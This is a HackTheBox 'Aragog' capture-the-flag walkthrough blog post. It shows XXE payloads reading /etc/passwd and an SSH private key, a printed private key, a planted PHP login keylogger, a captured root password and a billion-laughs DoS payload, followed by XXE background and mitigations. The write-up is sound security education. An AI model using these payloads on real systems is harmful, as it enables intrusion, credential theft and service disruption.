---
layout: post
title: 'HackTheBox - Aragog'
date: 2018-07-18
author: Casey Mullineaux
cover: '/images/htb/aragog/htb-aragog-00.jpg'
tags: hackthebox
---

Aragog was a delightful challenge on HackTheBox. It's up there with one of my favourites so far!

To complete this box, I was able to get a shell by exploiting an XML External Entity (XXE) vulnerability and lifting the ssh key file of a user. Once logged in, I discovered a hidden WordPress site containing a few clues. I then created a simple keylogger to capture the password of a user login in into to the WordPress site, and due to some password re-usage, was able to escalate to root.

# Hacking the box

1. [Enumeration](#enum)
2. [Exploitation](#exploit)
3. [Privilege escalation](#privesc)
4. [Deconstructing the hack](#deconstruct)

# <a name="enum"></a> Enumeration

Start with a nmap scan
```bash
root@vmw-kali:~/htb/aragog# nmap -sV -sC -oA aragog 10.10.10.78
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-21 19:14 AEST
Nmap scan report for 10.10.10.78
Host is up (0.31s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.230
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:21:fb:50:16:d4:93:dc:b7:29:1f:4c:c2:61:16:48 (RSA)
|   256 2c:94:00:3c:57:2f:c2:49:77:24:aa:22:6a:43:7d:b1 (ECDSA)
|_  256 9a:ff:8b:e4:0e:98:70:52:29:68:0e:cc:a0:7d:5c:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.85 seconds
```
The scan shows us that we have FTP and HTTP open, as well as the regular SSH.

Starting with the web server, I throw the IP into a browser and take a look. All I get is the default apache2 index.html.

![htb-aragog-01](/images/htb/aragog/htb-aragog-01.png)

I run `dirbuster`, and it reveals `hosts.php`. 
```bash
Starting dir/file list based brute forcing
Dir found: / - 200
Dir found: /icons/ - 403
Dir found: /icons/small/ - 403
File found: /wp-login.php - 500
File found: /hosts.php - 200
```

I browse and take a look.
![htb-aragog-02](/images/htb/aragog/htb-aragog-02.png)
An interesting little web app. It looks like it calculates the number of hosts in a subnet, but there doesn't seem to be any way to feed it any network/subnet information.

I decide to move on and poke at the FTP server. The first thing I try is logging in anonymously.
```bash
root@vmw-kali:~/htb/aragog# ftp 10.10.10.78
Connected to 10.10.10.78.
220 (vsFTPd 3.0.3)
Name (10.10.10.78:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Success! Listing the directory shows a single file - `test.txt`.
```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
226 Directory send OK.
ftp> 
```

So naturally, I download it.
```bash
ftp> get test.txt
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for test.txt (86 bytes).
226 Transfer complete.
86 bytes received in 0.00 secs (66.5486 kB/s)
ftp> 
```

The contents of `test.txt` seems to be XML.
```bash
root@vmw-kali:~/htb/aragog# cat test.txt 
<details>
    <subnet_mask>255.255.255.192</subnet_mask>
    <test></test>
</details>
root@vmw-kali:~/htb/aragog# 
```

The information inside this XML document looks like it could be related to what the `hosts.php` page is displaying. To find out, I sent the XML file over to the page to see what happens.
```bash
root@vmw-kali:~/htb/aragog# curl -X POST -d @test.txt 10.10.10.78/hosts.php

There are 62 possible hosts for 255.255.255.192

root@vmw-kali:~/htb/aragog# 
```

It looks like I'm doing XML injection today! One small problem though. I don't know anything about XML injection.

<p align="center">
    <img src="https://media.giphy.com/media/xUPGcmF2iGsTGEFVL2/giphy.gif" width="200">
</p>

# <a name="exploit"></a> Exploitation
After a few hours of googling *xml vulnerabilities*, I learn about a technique called **XML External Entities (XXE)** which is sitting at #4 on the [2017 OWASP Top 10](https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE))

> An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when a weakly configured XML parser processes XML input containing a reference to an external entity. This attack may lead to the disclosure of confidential data, denial of service, server-side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts. 

It seems that if this web server is vulnerable to XXE, I should be able to manipulate the XML file to reference an entity that is external to the XML document, such as a local file on the system.

I look at some example XML documents that exploit XXE, modify the XML in `test.txt` and save the file as `totallylegit.xml`.
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

<details>
    <subnet_mask>&xxe;</subnet_mask>
    <test></test>
</details>
```

 If this works, it should return the contents of `/etc/passwd`. I throw the XML containing XXE at `hosts.php` and see what happens.
```bash
root@vmw-kali:~/htb/aragog# curl -X POST -d @totallylegit.xml 10.10.10.78/hosts.php

There are 4294967294 possible hosts for root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
florian:x:1000:1000:florian,,,:/home/florian:/bin/bash
cliff:x:1001:1001::/home/cliff:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:123:130:ftp daemon,,,:/srv/ftp:/bin/false
```

<p align="center">
    <img src="https://media.giphy.com/media/3o8dFChfP80VOYSriE/giphy.gif">
</p>

I rerun the command and grep for `/bin/bash` to find all users with access to a shell.

```bash
root@vmw-kali:~/htb/aragog# curl -X POST -d @totallylegit.xml 10.10.10.78/hosts.php | grep /bin/bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2681  100  2487  100   194   3953    308 --:--:-- --:--:-- --:--:--  4262
There are 4294967294 possible hosts for root:x:0:0:root:/root:/bin/bash
florian:x:1000:1000:florian,,,:/home/florian:/bin/bash
cliff:x:1001:1001::/home/cliff:/bin/bash
```

--- 

<p class="note">   
To recap, at this point I have: <br>
- two accounts with shell access<br>
- an open SSH port<br>
- method to read files on disk.<br>
</p>

Time to get dem' SSH keys!

I craft a new XML document and save as `florian-key.xml`
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///home/florian/.ssh/id_rsa" >]>

<details>
    <subnet_mask>&xxe;</subnet_mask>
    <test></test>
</details>
```

I throw this one at `hosts.php` and redirect the output to `./florian.key`. 
```bash
root@vmw-kali:~/htb/aragog# curl -X POST -d @florian-key.xml 10.10.10.78/hosts.php > florian.key                                                         
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                          
                                 Dload  Upload   Total   Spent    Left  Speed
100  1933  100  1725  100   208   2751    331 --:--:-- --:--:-- --:--:--  3082    
```

After a little clean up, I've got a RSA key for **florian**.
```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d
+YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8
lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn
1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+
Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd
d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK
AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg
TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD
9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb
/oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV
0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1
sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV
Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH
zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE
rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE
tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3
HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/
I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg
ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7
HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y
kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs
4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+
7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3
daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv
uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA==
-----END RSA PRIVATE KEY-----
```

I try the same thing for **cliff** but no luck. I can't read **cliff**'s RSA key. 😪
Not to worry, I move on and get a shell on Aragog.
```bash
root@vmw-kali:~/htb/aragog# chmod 400 florian.key
root@vmw-kali:~/htb/aragog# ssh florian@10.10.10.78 -i florian.key 
Last login: Sat Jul 21 03:13:11 2018 from 10.10.15.91
florian@aragog:~$ 
```

<p class="success"> user shell obtained! </p>

<p align="center">
    <img src="https://media.giphy.com/media/39lYbuIEDqiDHAD0KT/giphy.gif">
</p>

# <a name="privesc"></a> Privilege escalation

The first thing I always do when I get a shell is to start enumerating the system. I start with the web directory to see if any files/folders were not picked up in the `dirbuster` scan.

```bash
florian@aragog:/var/www/html$ ls -l
total 24
drwxrwxrwx 5 cliff    cliff     4096 Jul 21 03:30 dev_wiki
-rw-r--r-- 1 www-data www-data   689 Dec 21  2017 hosts.php
-rw-r--r-- 1 www-data www-data 11321 Dec 18  2017 index.html
drw-r--r-- 5 cliff    cliff     4096 Dec 20  2017 zz_backup
florian@aragog:/var/www/html$ 
```

Unfortunately, I don't have permissions to see the contents of the `zz_backup` directory
```bash
florian@aragog:/var/www/html$ cd zz_backup/
-bash: cd: zz_backup/: Permission denied
```

I instead browse to `/dev_wiki`, but I get redirected to the hostname of the machine.
![htb-aragog-03](/images/htb/aragog/htb-aragog-03.png)

To fix that, I simply add the IP of Aragog to my hosts file.
```bash
root@vmw-kali:~/htb/aragog# echo "10.10.10.78 aragog" >> /etc/hosts
```
![htb-aragog-04](/images/htb/aragog/htb-aragog-04.png)

I browse around the blog and see this post that looks of interest.
![htb-aragog-05](/images/htb/aragog/htb-aragog-05.png)

From this post, I notice two critical pieces of information. 
1. > ... probably be restoring the site from backup fairly frequently!
2. > I’ll be logging in regularly... 

Cliff is logging in and running backups on a regular basis. More importantly, this is an **administrative** task that I may be able to abuse to escalate privilege.

I try to see if **cliff** has anything is scheduled, like a backup task.
```bash
florian@aragog:/dev/shm$ crontab -u cliff -l
must be privileged to use -u
florian@aragog:/dev/shm$ 
```

No luck. Time to get sneaky.

To find out in exactly what Cliff is doing, I create and run a simple process monitor shell script. This script watches the list of running processes, and display any new processes that start.
```bash
#!/bin/bash

# Loop by line
IFS=$'\n'

old_proces=$(ps -eo command)

while true
do
  new_process=$(ps -eo command)
  diff <(echo "$old_process") < (echo "$new_process") | grep [\<\>]
  sleep 1
  old_process=$new_process
done
```

I monitor the processes for a little while and eventually get a hit. I'm able to capture a cron job being executed that uses a python script (`wp-login.py`) to log **cliff** into the Wordpress blog, as well as a restore script aimed at the wiki. This is exactly what the blog post said would be happening.
```bash
/usr/sbin/CRON -f
< /bin/sh -c /usr/bin/python /home/cliff/wp-login.py
< /bin/sh -c /bin/bash /root/restore.sh
< /usr/bin/python /home/cliff/wp-login.py
< /bin/bash /root/restore.sh
< rm -rf /var/www/html/dev_wiki/
```

Although I can't access the script in **cliff**'s home directory, I *can* access the Wordpress login page located at `/var/www/html/dev_html/wp-login.php`. A simple keylogger will do the trick!

I browse to `wp-login.php` in my browser and view the source. I make a note of the `name` property on the password input field.
![htb-aragog-06](/images/htb/aragog/htb-aragog-06.png)

I edit `wp-login.php` and add some PHP code to the top of the file that writes the value entered into password field out to `/dev/shm/totallynotapassword.txt`
![htb-aragog-07](/images/htb/aragog/htb-aragog-07.png)

After waiting a little bit for the cron job to execute and **cliff** to log in again, I check for the loot.
```bash
florian@aragog:/var/www/html/dev_wiki$ cat /dev/shm/totallynotapassword.txt 
!KRgYs(JFO!&MTr)lf
```

<p align="center">
    <img src="https://media.giphy.com/media/12Oy8aAs0CbTgY/giphy.gif">
</p>

<p class="success"> Password obtained! </p>

Armed with the password, I try and switch user to **cliff**.
```bash
florian@aragog:/var/www/html/dev_wiki$ su - cliff
Password: 
su: Authentication failure
```
Bugger.

How about root?
```bash
florian@aragog:/var/www/html/dev_wiki$ su - root
Password: 
root@aragog:~# 
```

<p align="center">
    <img src="https://media.giphy.com/media/FnGJfc18tDDHy/giphy.gif">
</p>

# <a name="deconstruct"></a>Deconstructing the hack
## Background
The vulnerability exploited in this challenge is one that has been around for a while; however it's making a solid comeback. The [Open Web Application Security Project (OWASP)](https://www.owasp.owg) ranks this vulnerability as [#4 on their top 10](https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)) for 2017, not simply because of its impact, but also the likelihood and how common this vulnerability has been exploited from reported breaches.

The problem was first reported as early as 2002 but was not seen to be widely addressed until 2008. The vulnerability is still present today, and OWASP has been seeing a rise in its exploitation resulting in it making the Top 10 list for 2017. The previous OWASP Top 10, which came out in 2014, did not include XXE.

In 2014, it was reported that an XXE vulnerability was found to affect all versions of WordPress and Drupal CMS platforms, as well as several Joomla extensions. It is said the exposure of the vulnerability endangered more than **250 million** websites as a conservative guess, or **more than a quarter** of the entire internet's website population at that time.

## How it works

### What are XML external entities?
An XML entity can be thought of as something that is used to describe data. This enables two systems running on different technologies to communicate and exchange data with one another using XML. 

The example below is a sample XML document which describes a pet. The `name`, `breed` and `age` are called **XML Elements**.
```xml
<?xml version="1.0"?>
<pet>
    <name>Fluffy, Destroyer of Worlds</name>
    <breed>Poodle</breed>
    <age>3</age>
</pet>     
```

XML documents can also contain something called **entities**, which are defined using a system identifier in the DOCTYPE header. Entities can access local or remote content.

The example bleow is a sample XML document that contians XML entities.
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE pets [ <!ELEMENT pets ANY >
<!ENTITY petName SYSTEM "file:///folder/pet1.txt" >]>

<pet>
    <name>&petName;</name>
    <breed>Poodle</breed>
    <age>3</age>
</pet>
```

In the code above, the entity `petName` is substituted with the value `file:///folder/pet1.txt`. When the XML is parsed, this entity is replaced with the respective value. The use of the keyword `SYSTEM` instructs the parser that the entity value should be read from the URI that follows. This can be very useful when a web application needs to refer to an entity value many times.

### What is an XXE attack?

As demonstrated in the above, using XML entities and the `SYSTEM` keyword causes an XML parser to read data from a URI and substitutes it within the document. This means that an attacker can send their own values and force the application to display it.

The example below is the XML document that I used to retrieve the SSH key of the **florian** user on Aragog.
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///home/florian/.ssh/id_rsa" >]>

<details>
    <subnet_mask>&xxe;</subnet_mask>
    <test></test>
</details>
```
Here you can see I'm using the `SYSTEM` keyword to reference the URI of a file on the local disk. The XML parser reads the file, and displays it back to the user.

## Known use cases
XXE was also most notably used in a Denial of Service (DOS) attack called the **billion laughs attack**, where the XXE payload contains multiple references to itself.

The example below defines 10 entities, each defined as consisting of 10 of the previous entity. When processed by the XML processor on the receiving server, this expands to **one billion** copies of the first entity. When this file is processed by the web server, all available resources are consumed attempting to do so, resulting in denial of service.

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

## Mitigation

Developer training is essential to identify and mitigate XXE. Besides that, preventing XXE requires:

- Whenever possible, use less complex data formats such as JSON, and avoiding serialisation of sensitive data.
- Patch or upgrade all XML processors and libraries in use by the application or on the underlying operating system. Use dependency checkers. Update SOAP to SOAP 1.2 or higher.
- Disable XML external entity and [DTD processing](https://msdn.microsoft.com/en-us/library/system.xml.xmlreadersettings.dtdprocessing(v=vs.110).aspx) in all XML parsers in the application, as per the OWASP Cheat Sheet ['XXE Prevention'.](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet)
- Implement positive ("whitelisting") server-side input validation, filtering, or sanitisation to prevent hostile data within XML documents, headers, or nodes.
- Verify that XML or XSL file upload functionality validates incoming XML using [XML Schema Definition (XSD)](https://en.wikipedia.org/wiki/XML_Schema_(W3C)) validation or similar.
- [Static Application Security Testing (SAST)](https://www.checkmarx.com/glossary/static-application-security-testing-sast/) tools can help detect XXE in the source code, although manual code review is the best alternative in large, complex applications with many integrations.

If these controls are not possible, consider using virtual patching, API security gateways, or Web Application Firewalls (WAFs) to detect, monitor, and block XXE attacks. 

[(Source)](https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE))